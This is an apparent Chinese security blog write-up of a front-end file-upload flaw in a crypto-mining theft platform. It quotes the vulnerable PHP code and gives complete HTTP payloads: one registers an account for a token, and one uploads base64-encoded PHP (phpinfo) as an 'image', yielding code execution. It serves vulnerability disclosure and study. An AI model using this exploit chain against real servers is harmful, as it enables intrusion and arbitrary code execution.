#  【1day】某无提示云挖矿4链盗u系统前台文件上传漏洞   
原创 Mstir  星悦安全   2025-05-26 05:52  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**项目编号:10033      内部编号:XY-101547**  
  
**无授权提示云挖矿4链盗u系统，修复后台无法登录问题，代码全开源无后门，优化后台模板 修复刷新余额报错问题，去授权提示 带最新4链提币接口 后台可直接提币.**  
  
**Fofa指纹：系统敏感，不予提供**  
  
****## 0x01 漏洞分析&复现  
  
**位于 /app/data/controller/api/auth/Center.php 控制器的image 方法，通过post传入base64参数，直接被带入Storage::instance 方法中，且未加过滤，导致漏洞产生.**  
  
****  
```
/*** Base64 图片上传*/publicfunction image()  {    try {      $data = $this->_vali(['base64.require' => '图片内容不为空！']);      if (preg_match('|^data:image/(.*?);base64,|i', $data['base64'])) {        [$ext, $img] = explode('|||', preg_replace('|^data:image/(.*?);base64,|i', '$1|||', $data['base64']));        $info = Storage::instance()->set(Storage::name($img, $ext ?: 'png', 'image/'), base64_decode($img));        $this->success('图片上传成功！', ['url' => $info['url']]);      } else {        $this->error('解析内容失败！');      }    } catch (HttpResponseException $exception) {      throw $exception;    } catch (\Exception $exception) {      $this->error($exception->getMessage());    }  }
```  
  
  
**要调用这个接口仅需登录权限，且可以直接通过接口注册**  
  
**/app/data/controller/api/Auth.php 这里的 initialize 所需要参数都可以传参.**  
  
```
protected function initialize()  {    // 接收接口类型    $this->type = $this->request->request('api');    $this->type = $this->type ?: $this->request->header('api-name');    $this->type = $this->type ?: $this->request->header('api-type');    // 检查接口类型    if (empty($this->type)) {      $this->error("未获取到接口类型字段！");    }    if (!isset(UserAdminService::TYPES[$this->type])) {      $this->error("接口类型[{$this->type}]未定义！");    }    // 获取用户数据    $this->user = $this->getUser();    $this->uuid = $this->user['id'] ?? '';    if (empty($this->uuid)) {      $this->error('用户登录失败！', '{-null-}', 401);    }  }/**     * 获取用户数据     * @return array     */protectedfunction getUser(): array  {    try {      if (empty($this->uuid)) {        $token = input('token') ?: $this->request->header('api-token');        if (empty($token)) $this->error('登录认证TOKEN不能为空！');        [$state, $info, $this->uuid] = UserTokenService::instance()->check($this->type, $token);        if (empty($state)) $this->error($info, '{-null-}', 401);      }      return UserAdminService::instance()->get($this->uuid, $this->type);    } catch (HttpResponseException $exception) {      throw $exception;    } catch (\Exception $exception) {      $this->error($exception->getMessage());    }  }
```  
  
  
**这里路由的登录接口在 /app/data/controller/api/Login.php 控制器的 register 方法**  
  
```
/*** 用户统一注册入口* @throws \think\admin\Exception* @throws \think\db\exception\DbException*/publicfunction register()  {    $data = $this->_vali([                         'region_province.default' => '',                         'region_city.default'     => '',                         'region_area.default'     => '',                         'username.default'        => '',                         'phone.mobile'            => '手机号码格式错误！',                         'phone.require'           => '手机号码不能为空！',                         // 'verify.require'          => '验证码不能为空！',                         'password.require'        => '登录密码不能为空！',                         ]);    // if (MessageService::instance()->checkVerifyCode($data['verify'], $data['phone'])) {    //     @验证码验证能完    // } else {    //     $this->error('验证失败！');    // }    $map = ['phone' => $data['phone'], 'deleted' => 0];    if ($this->app->db->name($this->table)->where($map)->count() > 0) {      $this->error('手机号已注册，请使用其它手机号！');    }    $data['password'] = md5($data['password']);    $user = UserAdminService::instance()->set($map, $data, $this->type, true);    empty($user) ? $this->error('手机注册失败！') : $this->success('用户注册成功！', $user);  }
```  
  
  
**Payload:**  
  
****  
```
POST /data/api.login/register HTTP/1.1Host: 192.168.200.128Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 33phone=13000000000&password=123456
```  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5doRIWT64jF0IYyOmp9NuaqoHywZPtwXEeeBe8kaIGfPaUOQS7XI3jc3POqCvViaP4ibZQl7mEMxIGQ/640?wx_fmt=other&from=appmsg "")  
  
**这里就获取到了Token，然后直接发包 Payload(注意这里 api-token 要换成你上面获取到的token):**  
  
****  
```
POST /data/api.auth.center/image HTTP/1.1Host: 192.168.200.128Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7api-token: 85449b8d46cd00ca5f15611aa0c6e44aapi-type: wapConnection: closeContent-Length: 65base64=data:image/php;base64,ZnVja3lvdTw/cGhwIHBocGluZm8oKTs/Pg==
```  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5doRIWT64jF0IYyOmp9NuaqgmbsU6kDIZ4icoWwicwgX4dCYZJB0PjyVNAibiaM5m2BBWhfk4iaXm4r7Qw/640?wx_fmt=other&from=appmsg "")  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5doRIWT64jF0IYyOmp9NuaqvrvicfYkYuHibenDWxL9d3jdGGM3vY2f8TThoT9jRS8fb0akagJtazaQ/640?wx_fmt=other&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**漏洞文件源码关注公众号发送 250526 获取!**  
  
****  
  
  
代码审计  
公开课，  
仿真靶场将于不久后上线，有兴趣可加下群，发广告直接踢，仅交流技术.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5doRIWT64jF0IYyOmp9NuaqF8W2VFkaZHBhU4HNkxiclX7ZoFQvNXR4vhmC8s4WIgBnwNAbX2eFDjA/640?wx_fmt=jpeg&from=appmsg "")  
  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
